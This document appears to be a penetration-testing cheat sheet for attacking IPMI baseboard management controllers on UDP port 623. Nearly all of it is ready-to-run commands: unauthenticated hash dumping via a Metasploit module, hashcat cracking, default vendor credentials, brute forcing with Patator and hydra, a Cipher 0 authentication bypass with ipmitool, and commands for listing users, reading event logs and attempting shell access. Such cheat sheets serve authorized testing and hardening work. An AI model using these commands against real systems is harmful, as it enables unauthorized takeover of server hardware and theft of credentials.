!!! tip "Start here"
    Dump IPMI hashes unauthenticated with MSF: `use auxiliary/scanner/ipmi/ipmi_dumphashes` — this works against IPMI 2.0 without needing credentials. Crack the resulting hashes offline with hashcat mode 7300. Default creds (`admin:admin`, `ADMIN:ADMIN`, `root:calvin`) are also worth trying immediately.

## Enumeration
### Checking for Open IMPI Port
```bash
nmap -sU -p 623 --script ipmi-version <target-ip>
```

## Authentication Attacks
IPMI commonly uses default or weak credentials (`admin:admin`, `ADMIN:ADMIN`, `root:calvin`, etc.). Attempt manual login:
```bash
ipmitool -I lanplus -H <target-ip> -U admin -P admin chassis status
```

Alternatively, we can brute-force credentials using Patator:
```bash
patator ipmi_login host=<target-ip> user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -x ignore:fgrep='Unauthorized name'
```

or hydra:
```bash
hydra -L users.txt -P passwords.txt ipmi://<target-ip> -V
```

## Exploiting Vulnerabilities
### Cipher 0 Auth Bypass
IPMI 2.0 sometimes allows authentication bypass using Cipher 0. Check if Cipher 0 is enabled using the following:
```bash
ipmitool -I lanplus -C 0 -H <target-ip> -U ADMIN -P randompassword user list
```

If enabled, exploit using the following commands:
```bash
ipmitool -I lanplus -C 0 -H <target-ip> chassis power status
```

#### Retrieving Sensitive information with Cipher 0 Enabled
##### Enumerate Users
```bash
ipmitool -I lanplus -H <target-ip> -U <user> -P <password> user list
```

##### Access Sensor Data:
```bash
ipmitool -I lanplus -H <target-ip> -U <user> -P <password> sensor
```

##### Access System Event Logs:
```bash
ipmitool -I lanplus -H <target-ip> -U <user> -P <password> sel list
```

##### Executing Remote Commands
If IMPI grants OS-level access:
```bash
ipmitool -I lanplus -H <target-ip> -U <user> -P <password> shell
```

If successful, execute `whoami` or `id` to confirm.
